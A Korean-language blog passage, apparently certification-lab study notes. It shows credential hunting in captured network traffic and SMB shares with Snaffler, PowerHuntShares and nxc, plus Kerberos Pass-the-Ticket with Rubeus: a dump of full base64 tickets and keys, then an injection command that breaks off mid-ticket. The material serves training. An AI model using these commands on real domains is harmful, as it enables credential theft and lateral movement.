---
title: "Password Attacks - Additional Techniques"
date: 2026-08-18
layout: single
excerpt: "네트워크 트래픽과 공유 폴더에서 자격 증명을 탐색하고, Windows와 Linux 환경의 Kerberos 티켓, keytab, ccache를 활용한 Pass the Ticket과 AD CS ESC8 기반 NTLM Relay 공격 흐름을 실습한다."
author_profile: true
toc: true
toc_label: "Password Attacks"
toc_icon: "book"
toc_sticky: true
categories: [cpts-infra]
tags: [windows, cpts, credential-hunting, kerberos, ptt, adcs, ntlm-relay]
---

네트워크 트래픽과 공유 폴더에서 자격 증명을 탐색하고, Windows와 Linux 환경의 Kerberos 티켓, keytab, ccache를 활용한 Pass the Ticket과 AD CS ESC8 기반 NTLM Relay 공격 흐름을 실습한다.

# Extracting Password from the Network

## Credential Hunting in Network Traffic

암호화되지 않은 네트워크 프로토콜이나 HTTP 요청을 사용하는 환경에서는 자격 증명과 민감 정보가 평문에 가까운 형태로 전송될 수 있다.

따라서 Wireshark나 tcpdump로 패킷을 캡처하고 프로토콜별로 필터링하면 이러한 정보를 확인할 수 있다.

예를 들어 HTTP 트래픽을 필터링해보면 `/process_payment` 로 전송되는 POST 요청의 Form Data에서 카드 번호, 만료일, CVV 등의 민감 정보가 노출되는 것을 확인할 수 있다:

![Password Attacks](/assets/cpts-infra/password-attacks-additional-techniques/pw-attacks1.png)

또한 FTP는 기본적으로 제어 채널을 암호화하지 않기 때문에 `USER`와 `PASS` 명령이 평문으로 노출될 수 있다. 

아래에서는 `leah:qwerty123` 으로 로그인하는 과정이 그대로 확인된다:

![Password Attacks](/assets/cpts-infra/password-attacks-additional-techniques/pw-attacks2.png)

이후 FTP 세션에서 `RETR creds.txt` 요청이 발생한 것을 통해 `creds.txt` 파일이 다운로드된 사실도 확인할 수 있다:

![Password Attacks](/assets/cpts-infra/password-attacks-additional-techniques/pw-attacks3.png)

이처럼 암호화되지 않은 프로토콜의 패킷을 통해 자격 증명이나 민감 정보가 노출될 수 있으며, 확보한 계정이 실제 서비스에서 재사용되는 경우 추가 접근으로 이어질 수 있다.

## Credential Hunting in Network Shares

SMB 공유 디렉토리와 같은 네트워크 공유에도 설정 파일, 스크립트, 백업 파일 등의 형태로 자격 증명이나 민감 정보가 남아 있을 수 있다.

### Snaffler

대표적인 자동화 도구로 `Snaffler.exe` 가 있으며, 접근 가능한 Windows 공유를 탐색하면서 비밀번호, 키, 설정 파일 등 민감할 가능성이 높은 파일을 규칙 기반으로 찾아준다.

다음과 같이 실행하면 Snaffler가 접근 가능한 공유에서 관심 파일과 패턴을 자동으로 분류해 출력한다:

```powershell
PS C:\Users\Public> Snaffler.exe -s

# SKIP

[INLANEFREIGHT\jbader@DC01] 2025-05-01 17:41:51Z [File] {Red}<KeepPassOrKeyInCode|R|passw?o?r?d?>\s*[^\s<]+\s*<|2.3kB|2025-05-01 05:22:48Z>(\\DC01.inlanefreight.local\ADMIN$\Panther\unattend.xml) 5"\ language="neutral"\ versionScope="nonSxS"\ xmlns:wcm="http://schemas\.microsoft\.com/WMIConfig/2002/State"\ xmlns:xsi="http://www\.w3\.org/2001/XMLSchema-instance">\n\t\t\ \ <UserAccounts>\n\t\t\ \ \ \ <AdministratorPassword>\*SENSITIVE\*DATA\*DELETED\*</AdministratorPassword>\n\ \ \ \ \ \ \ \ \ \ \ \ \ \ \ \ \ \ </UserAccounts>\n\ \ \ \ \ \ \ \ \ \ \ \ <OOBE>\n\ \ \ \ \ \ \ \ \ \ \ \ \ \ \ \ <HideEULAPage>true</HideEULAPage>\n\ \ \ \ \ \ \ \ \ \ \ \ </OOBE>\n\ \ \ \ \ \ \ \ </component
[INLANEFREIGHT\jbader@DC01] 2025-05-01 17:41:53Z [File] {Yellow}<KeepDeployImageByExtension|R|^\.wim$|29.2MB|2022-02-25 16:36:53Z>(\\DC01.inlanefreight.local\ADMIN$\Containers\serviced\WindowsDefenderApplicationGuard.wim) .wim
[INLANEFREIGHT\jbader@DC01] 2025-05-01 17:41:58Z [File] {Red}<KeepPassOrKeyInCode|R|passw?o?r?d?>\s*[^\s<]+\s*<|2.3kB|2025-05-01 05:22:48Z>(\\DC01.inlanefreight.local\C$\Windows\Panther\unattend.xml) 5"\ language="neutral"\ versionScope="nonSxS"\ xmlns:wcm="http://schemas\.microsoft\.com/WMIConfig/2002/State"\ xmlns:xsi="http://www\.w3\.org/2001/XMLSchema-instance">\n\t\t\ \ <UserAccounts>\n\t\t\ \ \ \ <AdministratorPassword>\*SENSITIVE\*DATA\*DELETED\*</AdministratorPassword>\n\ \ \ \ \ \ \ \ \ \ \ \ \ \ \ \ \ \ </UserAccounts>\n\ \ \ \ \ \ \ \ \ \ \ \ <OOBE>\n\ \ \ \ \ \ \ \ \ \ \ \ \ \ \ \ <HideEULAPage>true</HideEULAPage>\n\ \ \ \ \ \ \ \ \ \ \ \ </OOBE>\n\ \ \ \ \ \ \ \ </component
# SKIP
```

### PowerHuntShares

또한 `PowerHuntShares` 를 사용하면 도메인 내 SMB 공유, 권한, 과도하게 노출된 파일과 민감 데이터를 대규모로 조사할 수 있다:

```powershell
PS C:\Users\Public\PowerHuntShares> Invoke-HuntSMBShares -Threads 100 -OutputDirectory c:\Users\Public

 ---------------------------------------------------------------
 SHARE DISCOVERY
 ---------------------------------------------------------------
 [*][05/01/2025 12:51] Scan Start
 [*][05/01/2025 12:51] Output Directory: c:\Users\Public\SmbShareHunt-05012025125123
 [*][05/01/2025 12:51] Successful connection to domain controller: DC01.inlanefreight.local
 [*][05/01/2025 12:51] Performing LDAP query for computers associated with the inlanefreight.local domain
 [*][05/01/2025 12:51] -  computers found
 [*][05/01/2025 12:51] - 0 subnets found
 [*][05/01/2025 12:51] Pinging  computers
 [*][05/01/2025 12:51] -  computers responded to ping requests.
 [*][05/01/2025 12:51] Checking if TCP Port 445 is open on  computers
 [*][05/01/2025 12:51] - 1 computers have TCP port 445 open.
 [*][05/01/2025 12:51] Getting a list of SMB shares from 1 computers
 [*][05/01/2025 12:51] - 11 SMB shares were found.
 [*][05/01/2025 12:51] Getting share permissions from 11 SMB shares
# SKIP
```

탐색이 끝나면 결과를 HTML Report 형태로 확인할 수 있어, 위험한 ACE와 접근 가능한 민감 파일을 한눈에 정리하기 편리하다:

![Password Attacks](/assets/cpts-infra/password-attacks-additional-techniques/pw-attacks4.png)

### NXC Share Spidering

NXC의 Spider 기능을 사용하여 특정 SMB Share를 재귀적으로 탐색하고 파일 내용에서 `passw와`  같은 문자열을 찾는 방법도 있다:

```bash
$ nxc smb 10.129.234.173 -u mendres -p 'Inlanefreight2025!' --spider IT --content --pattern "passw"

SMB         10.129.234.173  445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:inlanefreight.local) (signing:True) (SMBv1:False)
SMB         10.129.234.173  445    DC01             [+] inlanefreight.local\mendres:Inlanefreight2025! 
SMB         10.129.234.173  445    DC01             [*] Started spidering
SMB         10.129.234.173  445    DC01             [*] Spidering .
SMB         10.129.234.173  445    DC01             //10.129.234.173/IT/Tools/split_tunnel.txt [lastm:'2025-05-01 13:26' size:224 offset:224 pattern:'passw']                                                                           
SMB         10.129.234.173  445    DC01             //10.129.234.173/IT/Tools/nishang-master/CHANGELOG.txt [lastm:'2025-05-01 13:27' size:11411 offset:4096 pattern:'passw']                                                            
SMB         10.129.234.173  445    DC01             //10.129.234.173/IT/Tools/nishang-master/README.md [lastm:'2025-05-01 13:27' size:17490 offset:12288 pattern:'passw']                                                               
SMB         10.129.234.173  445    DC01             //10.129.234.173/IT/Tools/nishang-master/ActiveDirectory/Add-ConstrainedDelegationBackdoor.ps1 [lastm:'2025-05-01 13:27' size:5055 offset:4096 pattern:'passw']                     
SMB         10.129.234.173  445    DC01             //10.129.234.173/IT/Tools/nishang-master/ActiveDirectory/Add-ConstrainedDelegationBackdoor.ps1 [lastm:'2025-05-01 13:27' size:5055 offset:5055 pattern:'passw']                     
SMB         10.129.234.173  445    DC01             //10.129.234.173/IT/Tools/nishang-master/Antak-WebShell/antak.aspx [lastm:'2025-05-01 13:27' size:10444 offset:4096 pattern:'passw']                                                
SMB         10.129.234.173  445    DC01             //10.129.234.173/IT/Tools/nishang-master/Antak-WebShell/antak.aspx [lastm:'2025-05-01 13:27' size:10444 offset:10444 pattern:'passw'] 
```

이처럼 파일 내용에 `passw`가 포함된 위치를 빠르게 식별할 수 있다.

첫 번째 결과인 `split_tunnel.txt` 를 확인하면 다음과 같이 실제 자격 증명이 평문으로 기록되어 있음을 확인할 수 있다:

```text
Old settings for legacy VPN deployment:
- Use split tunneling where possible
- DNS resolution priority = local > remote

# Auth backup password: INLANEFREIGHT\jbader:ILovePower333###

- Ports used: 443, 8443, 1194
```

# Windows 리터럴 무브먼트 Techniques

## Pass the Ticket (PtT) from Windows

AD 환경에서는 Kerberos 티켓이 사용자의 인증 상태를 증명하는 데 사용된다.

유효한 사용자의 Kerberos 티켓을 확보하면 해당 사용자의 평문 비밀번호를 몰라도 티켓의 유효 기간과 권한 범위 내에서 Kerberos 인증을 재사용할 수 있으며, 이를 Pass the Ticket(PtT)이라고 한다.

여기서는 먼저 로컬 호스트에서 관리자 권한을 확보한 뒤, 메모리에 존재하는 다른 도메인 사용자의 티켓을 이용해 횡적 이동하는 시나리오를 살펴본다.

### Dumping Kerberos Tickets

관리자 권한으로 `Rubeus dump` 를 사용하면 현재 호스트의 LSA/Kerberos 티켓 캐시에 존재하는 여러 로그온 세션의 티켓을 열거할 수 있다:

```powershell
PS C:\Users\Administrator> .\Rubeus.exe dump /nowrap

Action: Dump Kerberos Ticket Data (All Users)

[*] Current LUID    : 0x14d304

  UserName                 : julio
  Domain                   : INLANEFREIGHT
  LogonId                  : 0x44708
  UserSID                  : S-1-5-21-3325992272-2815718403-617452758-1106
  AuthenticationPackage    : Kerberos
  LogonType                : Service
  LogonTime                : 8/19/2026 2:46:30 PM
  LogonServer              : DC01
  LogonServerDNSDomain     : INLANEFREIGHT.HTB
  UserPrincipalName        : julio@inlanefreight.htb


    ServiceName              :  krbtgt/INLANEFREIGHT.HTB
    ServiceRealm             :  INLANEFREIGHT.HTB
    UserName                 :  julio
    UserRealm                :  INLANEFREIGHT.HTB
    StartTime                :  8/19/2026 2:46:30 PM
    EndTime                  :  8/20/2026 12:46:30 AM
    RenewTill                :  8/26/2026 2:46:30 PM
    Flags                    :  name_canonicalize, pre_authent, initial, renewable, forwardable
    KeyType                  :  aes256_cts_hmac_sha1
    Base64(key)              :  e/3iHa4EJoSXfh5Zx3sXyOP/vGJtCcT9XJVbaUQq78Q=
    Base64EncodedTicket   :

      doIFujCCBbagAwIBBaEDAgEWooIEszCCBK9hggSrMIIEp6ADAgEFoRMbEUlOTEFORUZSRUlHSFQuSFRCoiYwJKADAgECoR0wGxsGa3JidGd0GxFJTkxBTkVGUkVJR0hULkhUQqOCBGEwggRdoAMCARKhAwIBAqKCBE8EggRLHKvsJTiHT12KfCHeVsEnVmr4ufMuH1fLivAeQ3OQayj1wrzl6GiwptrLMoj/M9vGjbu3010EC9QmX5L4rg+oiP8j5F4E8T5D0vYIFCnr5Wmw8aukB0Sv9Q6p9ulnBxkYV8sr+LoSg/ITqj08SmbauS8ejyebhH50xpTPfXKYiYMdC2Mqj0aacsuRy1xjSOFyJudb97PtyFCfCL7E4DZ97K+tNemgfRw/HC3wSJif+rgGDyl23KuCvAOAT28bH83I3LbDB/MVW/A/3PiSNHaUu9RhKP+PkCBd8REsVfMgatf2EOeD/X/wKRNZUoVcg5pkoJ6O+rFz9q2A14UHbhXfxQ4DNz7QK4OGNZ66bb1I6I+kkNZMZM48T4TZfW0K4yuGPoVsuz6XXtNAE3nLkN2rZ2dd32d7xr2aAZpyqTWdZKHr+soDV5VX7mKsOf385oIKrVwWDCTeOGdp7WAnqKvmxaLDzM+1kdTzdbYTzn9e/NzRbGpAgTlIJ4hdY2PkMzY/vSG+b8DqMJdTt5rx9uQQluT8pwSGzGEAz8u52UbXLeq00QczvrW9ScisUHaq09NCWq4jzjmjMzrOCSkVDQBJWyv20YLEoVTGpXQcKKcN3mUVg8f0uVLpjmGAk0/xFJSKHywnhW9rcZvdGA2+LOcBPDXLJqee7C/YvbX7ucKXT76THIofbOjwcWHB+s57n0ywUk3YjEnsC9SJJh0G01QKAb+v1xAn1d3mGUgu1/kKRJ+kG1fifNoAOL8NKFMuJrhG2EQzE2BpUwrMGObx25SkXS18xGjTFsgfGTm1sXMsuPwN9g8ga0BieOzSkN9L5a8en4LSgvVWzab4/SHUtlFGRNLUjwWjqYVt7en5b/dTMY/DXISttfmVnv+aFAJ8qT0OA//Oy/Sx4Od/TaEWsYV+Nvnf/KHcsLmjosC0lCV1FJYnuBna4gdH/sQKiJuSrjU42Bx8TtFT8Z1UqP2pcyI/ABCsoQkgiCmGB37OO+EKdKkSgQL9vBNYDexLVodefxiQ+lJZVLDzjE9XNvAfA13/lE/FZoFrWl3vF3ZdvdKLp7xB3QjI++0pzdDndpe3E7xsdUx+eAL9oT4F9vJ7L5T1ZA8HoBA9Y27Pi8d3WMzA2D13THCta92mKxWJh+CEWaV3YKIY6+mJdZLyEJVgorQ7gKJzJ1DaLFFgN2z+tspK7g8pJ3Sy8YCiBHbenQFOpirkX55uppyEIhCCgxB/jOuY1oyE+0E5mqV/ooy7dBpl9qvZKvQ4bkWN7j1wVttu6aJzjbTFYaJXLvmqaM48GZBEEFj/WIhIhC+uv2K3VebK6TLIQ5CKj7xb4yLI6Y9GeGwAVmM5fbsA3palWvSF8runSevPzo8l5/C8rNtqBb+CAqScc7cu6tJ08EZS5sXLEr/cW7jh6qmc1UU9JMekrvWj4mg/b3X4b8u0IBC62xjdXxGiJoxHKPaAPXxlyqOB8jCB76ADAgEAooHnBIHkfYHhMIHeoIHbMIHYMIHVoCswKaADAgESoSIEIHv94h2uBCaEl34eWcd7F8jj/7xibQnE/VyVW2lEKu/EoRMbEUlOTEFORUZSRUlHSFQuSFRCohIwEKADAgEBoQkwBxsFanVsaW+jBwMFAEDhAAClERgPMjAyNjA4MjYxOTQ2MzBaphEYDzIwMjYwODI3MDU0NjMwWqcRGA8yMDI2MDkwMjE5NDYzMFqoExsRSU5MQU5FRlJFSUdIVC5IVEKpJjAkoAMCAQKhHTAbGwZrcmJ0Z3QbEUlOTEFORUZSRUlHSFQuSFRC

  UserName                 : david
  Domain                   : INLANEFREIGHT
  LogonId                  : 0x45a36
  UserSID                  : S-1-5-21-3325992272-2815718403-617452758-1107
  AuthenticationPackage    : Kerberos
  LogonType                : Service
  LogonTime                : 8/19/2026 2:46:30 PM
  LogonServer              : DC01
  LogonServerDNSDomain     : INLANEFREIGHT.HTB
  UserPrincipalName        : david@inlanefreight.htb


    ServiceName              :  krbtgt/INLANEFREIGHT.HTB
    ServiceRealm             :  INLANEFREIGHT.HTB
    UserName                 :  david
    UserRealm                :  INLANEFREIGHT.HTB
    StartTime                :  8/19/2026 2:46:31 PM
    EndTime                  :  8/20/2026 12:46:31 AM
    RenewTill                :  8/26/2026 2:46:31 PM
    Flags                    :  name_canonicalize, pre_authent, initial, renewable, forwardable
    KeyType                  :  aes256_cts_hmac_sha1
    Base64(key)              :  qU8MprSv2c8wGJycPkEHQdgAU+c6Dl5nnuvfz9YC6Rg=
    Base64EncodedTicket   :

      doIFsjCCBa6gAwIBBaEDAgEWooIEqzCCBKdhggSjMIIEn6ADAgEFoRMbEUlOTEFORUZSRUlHSFQuSFRCoiYwJKADAgECoR0wGxsGa3JidGd0GxFJTkxBTkVGUkVJR0hULkhUQqOCBFkwggRVoAMCARKhAwIBAqKCBEcEggRDCg2Bbn+zccJ5p7FjE6yefZXv5+qMYzVEqd5fY4XMhkJ2C48lY+Kil9Jc7PjPSrsNobZYlnzjVF5i7EwLdwFpbwQ6tR1ytp2Ab6u5U1cglSHTSkN1cpqDI+f74O2bR8VBvZPMb0RpzJ/xUwoN+LAgUf7yWlfqwu4bD8G1TfN6jdf2Be3MeyGOH3LKhjJfEbpPihsOGiIdxUTI7JioZ+1jJQ/5ywucaLh+E+kAUe+OfLZqP8LCNkVW+VvXvka2zIY8qvvtKzuAQN1FaA4mvx5G5202PCfr30EXJ1qv+nRGDa5pB5zNV6XWnwVEl8kOI8OOIi+sarZ7YgeTYbtTmynp8C2UXsLzPDSOfM0knZXu8wzyO//Ly+/w7cvR8XVlLnuuYTlLCXRIacG3fbqRJ+NpOM7BkmLgG+BefaskZQ5iQ1/IBTCoO0t6U/rt8E9UDu63B/J3lMset+OZMT6F/ERT+iWBVQOhFR8g7LPR+gW7SXGDpd3x0hehiZHb/fUUG3X3kKhbU75F509SfBu6Hin2Am0pZnQP19T1MfTTkzJm/BlTeoMVg8h6kDj8ysOtEvqbMU+8zqdDF9IMqgiSE/kzeS3P+8iHMhTQETIub49LeCWpuWZV//YaU5DgLHpNTHYYAjETnrBKRjOMmWuQeDc/lMt15PIjs+ctJIjx5JGB8B+ndwKwNSaO6fXbeZEzw4zLW4ptD/Thy/xftob0XTt5m/ij0YUyyATd9Ayex09Lh0uH9ESMmZFOg8G7RAn+nXQ83yvh+Yo50/uUO2FCyNeHtFEGYllRb2Wcp8CmIVknKDDfAFgAw225YrofmWuraUOXrLF9rxy6OabrwPvgzQNZhS1Rn6vrqOYStBYiS92bf4BAMMuaCGsR6iKxe/XzQgtbp6ujXzGvfYOYz3illnwHpa5wv5nzrRnOfieYdRwtYrgNLgaZLq8UbGJ8asrrCdZhJ7d5mxoMeDzSnMK5vmVhFG92Ay0q0/0WlPAUK12HvY2AeM45JhM9GPOYzbCrJEAdg+PPmCgMjsdOBonB8dL8P+jv0kMukfkmI2tTi+o8GQB0moEbTCdw+1EIyRXNNMCO0AaxAdxTmTIr9r5npP+oIo1IS7F7WluV68sXur+geIg4vLtjWyFwO0+GZ+jdvq1pU2PPXWjCn2TT4IOPopa2hNZyvVAReEQu27PrjNU59GWtXdgW628QQvDhNLXuLtCO88UI/YCuGQDEtUhu4vWS7+RBqeNtgXC3pRYAlc5+vuyCs4ne+1vEwkFyVWpRq/XmricNpOihWQG7mC4EF96S6vxxUBAc5GyRKGBAg5AmL/90fDEbYP0ygjewPTA4gjm+9YaHLtNR3PgQS8aBR5GEzkWlkmHE7IqeqAdsGyu+Mp3Z3vCzGLS9+7Xk2TlXUD3aeFgQahy3F5GBEX386LkWy+nOmXvH7+LEDOkoCq6DWKmodTCjgfIwge+gAwIBAKKB5wSB5H2B4TCB3qCB2zCB2DCB1aArMCmgAwIBEqEiBCCpTwymtK/ZzzAYnJw+QQdB2ABT5zoOXmee69/P1gLpGKETGxFJTkxBTkVGUkVJR0hULkhUQqISMBCgAwIBAaEJMAcbBWRhdmlkowcDBQBA4QAApREYDzIwMjYwODI2MTk0NjMxWqYRGA8yMDI2MDgyNzA1NDYzMVqnERgPMjAyNjA5MDIxOTQ2MzFaqBMbEUlOTEFORUZSRUlHSFQuSFRCqSYwJKADAgECoR0wGxsGa3JidGd0GxFJTkxBTkVGUkVJR0hULkhUQg==

  UserName                 : john
  Domain                   : INLANEFREIGHT
  LogonId                  : 0x450ea
  UserSID                  : S-1-5-21-3325992272-2815718403-617452758-1108
  AuthenticationPackage    : Kerberos
  LogonType                : Service
  LogonTime                : 8/19/2026 2:46:30 PM
  LogonServer              : DC01
  LogonServerDNSDomain     : INLANEFREIGHT.HTB
  UserPrincipalName        : john@inlanefreight.htb


    ServiceName              :  krbtgt/INLANEFREIGHT.HTB
    ServiceRealm             :  INLANEFREIGHT.HTB
    UserName                 :  john
    UserRealm                :  INLANEFREIGHT.HTB
    StartTime                :  8/19/2026 2:46:30 PM
    EndTime                  :  8/20/2026 12:46:30 AM
    RenewTill                :  8/26/2026 2:46:30 PM
    Flags                    :  name_canonicalize, pre_authent, initial, renewable, forwardable
    KeyType                  :  aes256_cts_hmac_sha1
    Base64(key)              :  cjopRz7eJOhR0VMKCkHnQZ436Ue0HlleaLJGxlR0pY8=
    Base64EncodedTicket   :

      doIFqDCCBaSgAwIBBaEDAgEWooIEojCCBJ5hggSaMIIElqADAgEFoRMbEUlOTEFORUZSRUlHSFQuSFRCoiYwJKADAgECoR0wGxsGa3JidGd0GxFJTkxBTkVGUkVJR0hULkhUQqOCBFAwggRMoAMCARKhAwIBAqKCBD4EggQ69cPsRJ8UxiRmke3oGPZpoT2TbBanqI5k906Oeu0tkXibLfbKo1cxXBDNSlihlMuZeDiGpriYweBnko6pp+14vTZqgUMoi8AnMLG3cUc35mh81XWKyRcPUBcQsb0em7kqM/AUG+Q/Xryv95SUdztsmXu7BqStCOuscPFqoUIyofIveI56hEEWa6FDgm/gD0BomrDuWb3Fr8OOjJiWXY/9IwGoV4RldE+MYQ1WOO1LNnCAsrhI9uS4zol6NYtNmjtdMrjRJwNMl1jXk01ly1PMDwswf7RLwv6HRftzds4B5qkl/qWRFoWQ7LANQYB9SYZHsruiGxh0gCPNFjcaMau5z4oPewEJiZiiX1lPmRCto1/fbVarqni1N9hXMMRdtBBHNOHFEXnxNlxRxVO9uVn3MzUv5+JQ4oetFb/0KLhqtP1mqUtnuReZxKcFB9Rsc5jmNP/cwaMjv33QDZIXRybgvMUkKcxDeNNdqIZPkf2r3vgekA8ll0/wjtou49P9PSvqnnzD9AKvujzepFOPHBEVNCoXfABsIvMxChtygrTE+eUbbfUuURwdDMeFB6eJhYdRqLMJ2M50pNwtF0PrjFZXKpbki1JMiFSfSyfVijvHhfX+9DsWWf/WZRq2kuZJqdpKmvgYv71a011qU8M+earQFczEMLDdsiWuC48YwlQhTmQ6mvJKOfOpyqVv/5xN5SeDbaxtQBvtuN0fc3p+8bqs50nxy2IZNwF9WWiDKq0IaVhAD9lCcKc87XNa6yIxXBwxQn1bqE+tDdJUmBW4x2kzqupt2z3Wrs8elYq0Dj4EYzAbjELzFiDFBSWo6IoQBDnA5DQYwqbAzDcbg3wzGE1ZP8D21vmm8Ok7TbF+IFo06Ly61e1dClC8xB8KmhvV/miGMcRf1EpJqoJSnL6bCmzS34G4vW5T+KwPhTlBYVvxqilL4uo0LoyKiwq2rNOWg25xZP+eb8ZlQjJ4BZWO8TaUxmI0zGziKee9H969lz3AzGHpW8Lb5H/0ORcLe/qH8Jt4mFUe38EJkilqIvvSB9KfjCnZEnx6X1qAGXH5rfThJ7ni6kKgmCiYX9XroTFiK5Djmq9q0QF7OM//tAhPLolGKl3pb7kuPCDHLgu+qvMzPC4GakpGUS9QRBJ4evfLkWQR58FLtmTP9jj/pwYLN3W1yipVvT7s95QAifA7QdhzWfH00KvNc18NUEmnxS0RLYUNOf3XoA3LelxoT7qgavoAN/1rlUgQO2IShO3cNphCH+BzloWcq874Tn1kqeUaW8mYkjKJX4nKBZ3fp0gqPfD54fJ4tmhmL0yn87JKd1exdx1yenhunCCBvGxTav7MoBVaK5gshbtLfAZtzwuHrDHRlbl+MmlWnGFAzoTwg8kKuUufxi6ytlbPy7WdieiLzPFnB32DYtOTDeYsEtCVok/hOI74mFMwKK2rG3qjgfEwge6gAwIBAKKB5gSB432B4DCB3aCB2jCB1zCB1KArMCmgAwIBEqEiBCByOilHPt4k6FHRUwoKQedBnjfpR7QeWV5oskbGVHSlj6ETGxFJTkxBTkVGUkVJR0hULkhUQqIRMA+gAwIBAaEIMAYbBGpvaG6jBwMFAEDhAAClERgPMjAyNjA4MjYxOTQ2MzBaphEYDzIwMjYwODI3MDU0NjMwWqcRGA8yMDI2MDkwMjE5NDYzMFqoExsRSU5MQU5FRlJFSUdIVC5IVEKpJjAkoAMCAQKhHTAbGwZrcmJ0Z3QbEUlOTEFORUZSRUlHSFQuSFRC
```

이처럼 현재 호스트의 Kerberos 티켓 캐시에 `john`, `david`, `julio` 등의 TGT가 존재하는 것을 확인할 수 있다.

유효한 티켓을 현재 로그온 세션에 주입하면 해당 사용자 컨텍스트로 Kerberos 서비스 티켓을 요청할 수 있으며, 대상 서비스에서 해당 사용자가 가진 권한 범위 내에서 인증에 활용할 수 있다.

### Kerberos Ticket Flow

Kerberos의 기본적인 티켓 발급 흐름은 다음과 같다.

예를 들어 `john` 이 처음 인증할 때는 KDC의 AS(Authentication Service)에 AS-REQ를 보내고, 사전 인증이 정상적으로 검증되면 AS-REP로 TGT를 발급받는다.

이 TGT는 도메인의 `krbtgt` 계정 키로 암호화되어 있으며, 이후 KDC가 사용자의 인증 상태를 검증하는 데 사용한다.

이 상태에서 `john` 이 SMB와 같은 특정 서비스에 접근하려면 TGT를 이용하여 KDC의 TGS(Ticket Granting Service)에 해당 서비스용 TGS를 요청한다.

TGS는 TGT를 `krbtgt` 키로 검증하고 요청이 유효하면 대상 서비스의 키로 보호된 Service Ticket(TGS)을 발급한다. 

클라이언트는 이 Service Ticket을 대상 서비스에 제시해 인증한다.

Golden Ticket은 `krbtgt` 의 장기 키를 알고 있을 때 공격자가 로컬에서 임의의 TGT를 위조하는 기법이다. 

TGT 자체는 KDC에 요청하지 않고 만들 수 있지만, 일반적인 서비스 접근에서는 이 위조 TGT를 사용해 KDC에 TGS를 요청하게 된다.

반면 Silver Ticket은 대상 서비스 계정의 키를 이용해 Service Ticket 자체를 위조하는 방식이므로, 특정 서비스에 접근하는 과정에서 KDC와 통신하지 않고 사용할 수 있다.

### Local and Domain Accounts

로컬 계정과 도메인 계정은 서로 다른 보안 주체이므로 구분해야 한다.

예를 들어 현재 세션에서 `whoami` 를 확인하면 다음과 같다:

```powershell
PS C:\Users\Administrator> whoami

ms01/administrator
```

이 출력의 `MS01\Administrator` 는 `MS01` 호스트의 로컬 Administrator 계정으로 로그인한 상태라는 의미이다.

호스트 자체가 AD 도메인에 가입되어 있을 수 있어도 로컬 계정과 `INLANEFREIGHT\Administrator` 같은 도메인 계정은 서로 다른 SID와 자격 증명을 가진 별개의 계정이다.

따라서 도메인 사용자의 TGT는 해당 도메인 Principal의 Kerberos 인증에 사용되는 것이며, 이름이 같다는 이유만으로 로컬 계정의 인증 수단으로 사용할 수는 없다.

로컬 계정은 일반적으로 SAM 기반 인증을 사용하며 Kerberos TGT를 발급받지 않는다.

현재는 도메인 계정인 `john`, `david`, `julio`의 TGT를 확보했으므로, 이 티켓을 이용해 해당 사용자에게 허용된 SMB 등의 서비스에 대한 TGS를 요청할 수 있다.

### Injecting and Reusing the TGT

먼저 PtT를 이용하여 `john` 의 TGT를 현재 로그온 세션에 주입하였다:

```powershell
PS C:\Users\Administrator> .\Rubeus.exe ptt /ticket:doIFqDCCBaSgAwIBBaEDAgEWooIEojCCBJ5hggSaMIIElqADAgEFoRMbEUlOTEFORUZSRUlHSFQuSFRCoiYwJKADAgECoR0wGxsGa3JidGd0GxFJTkxBTkVGUkVJR0hULkhUQqOCBFAwggRMoAMCARKhAwIBAqKCBD4EggQ69cPsRJ8UxiRmke3oGPZpoT2TbBanqI5k906Oeu0tkXibLfbKo1cxXBDNSlihlMuZeDiGpriYweBnko6pp+14vTZqgUMoi8AnMLG3cUc35mh81XWKyRcPUBcQsb0em7kqM/AUG+Q/Xryv95SUdztsmXu7BqStCOuscPFqoUIyofIveI56hEEWa6FDgm/gD0BomrDuWb3Fr8OOjJiWXY/9IwGoV4RldE+MYQ1WOO1LNnCAsrhI9uS4zol6NYtNmjtdMrjRJwNMl1jXk01ly1PMDwswf7RLwv6HRftzds4B5qkl/qWRFoWQ7LANQYB9SYZHsruiGxh0gCPNFjcaMau5z4oPewEJiZiiX1lPmRCto1/fbVarqni1N9hXMMRdtBBHNOHFEXnxNlxRxVO9uVn3MzUv5+JQ4oetFb/0KLhqtP1mqUtnuReZxKcFB9Rsc5jmNP/cwaMjv33QDZIXRybgvMUkKcxDeNNdqIZPkf2r3vgekA8ll0/wjtou49P9PSvqnnzD9AKvujzepFOPHBEVNCoXfABsIvMxChtygrTE+eUbbfUuURwdDMeFB6eJhYdRqLMJ2M50pNwtF0PrjFZXKpbki1JMiFSfSyfVijvHhfX+9DsWWf/WZRq2kuZJqdpKmvgYv71a011qU8M+earQFczEMLDdsiWuC48YwlQhTmQ6mvJKOfOpyqVv/5xN5SeDbaxtQBvtuN0fc3p+8bqs50nxy2IZNwF9WWiDKq0IaVhAD9lCcKc87XNa6yIxXBwxQn1bqE+tDdJUmBW4x2kzqupt2z3Wrs8elYq0Dj4EYzAbjELzFiDFBSWo6IoQBDnA5DQYwqbAzDcbg3wzGE1ZP8D21vmm8Ok7TbF+IFo06Ly61e1dClC8xB8KmhvV/miGMcRf1EpJqoJSnL6bCmzS34G4vW5T+KwPhTlBYVvxqilL4uo0LoyKiwq2rNOWg25xZP+eb8ZlQjJ4BZWO8TaUxmI0zGziKee9H969lz3AzGHpW8Lb5H/0ORcLe/qH8Jt4mFUe38EJkilqIvvSB9KfjCnZEnx6X1qAGXH5rfThJ7ni6kKgmCiYX9XroTFiK5Djmq9q0QF7OM//tAhPLolGKl3pb7kuPCDHLgu+qvMzPC4GakpGUS9QRBJ4evfLkWQR58FLtmTP9jj/pwYLN3W1yipVvT7s95QAifA7QdhzWfH00KvNc18NUEmnxS0RLYUNOf3XoA3LelxoT7qgavoAN/1rlUgQO2IShO3cNphCH+BzloWcq874Tn1kqeUaW8mYkjKJX4nKBZ3fp0gqPfD54fJ4tmhmL0yn87JKd1exdx1yenhunCCBvGxTav7MoBVaK5gshbtLfAZtzwuHrDHRlbl+MmlWnGFAzoTwg8kKuUufxi6ytlbPy7WdieiLzPFnB32DYtOTDeYsEtCVok/hOI74mFMwKK2rG3qjgfEwge6gAwIBAKKB5gSB432B4DCB3aCB2jCB1zCB1KArMCmgAwIBEqEiBCByOilHPt4k6FHRUwoKQedBnjfpR7QeWV5oskbGVHSlj6ETGxFJTkxBTkVGUkVJR0hULkhUQqIRMA+gAwIBAaEIMAYbBGpvaG6jBwMFAEDhAAClERgPMjAyNjA4MjYxOTQ2MzBaphEYDzIwMjYwO